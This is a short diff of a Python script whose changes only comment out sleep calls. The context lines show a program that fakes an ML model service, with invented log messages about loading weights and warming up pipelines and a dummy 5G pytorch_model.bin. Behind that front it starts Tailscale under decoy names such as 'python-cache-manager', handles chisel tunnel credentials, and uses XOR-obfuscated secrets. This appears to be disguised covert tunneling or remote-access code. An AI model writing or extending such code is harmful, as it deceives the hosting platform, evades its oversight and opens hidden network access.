@@ -159,19 +159,19 @@ def main():
         subprocess.run(["truncate", "-s", "5G", "/home/user/pytorch_model.bin"])
 
     logger.info("Loading model weights into VRAM...")
-    time.sleep(2)
+   # time.sleep(2)
 
     # Start the background jitter thread
     threading.Thread(target=jitter_task, daemon=True).start()
 
     delay = random.randint(2, 3)
     logger.info(f"Synchronizing gradient checkpoint topology (standby for {delay}s)...")
-    time.sleep(delay)
+    #time.sleep(delay)
 
     # 5. Start Tailscale (python-cache-manager)
     tailscale.start_daemon(ts_log)
 
-    time.sleep(2)
+    #time.sleep(2)
     logger.info("Warming up text-generation pipelines...")
 
     # Environment Variable Scrubbing (XOR Obfuscated Single Secrets & Standardized Fallbacks)
@@ -211,7 +211,7 @@ def main():
     chisel_auth = ""
 
     # 9. Connect to Tailscale (py-cache-cli)
-    time.sleep(5)
+    #time.sleep(5)
     tailscale.connect(ts_log, full_token)
     full_token = ""
 
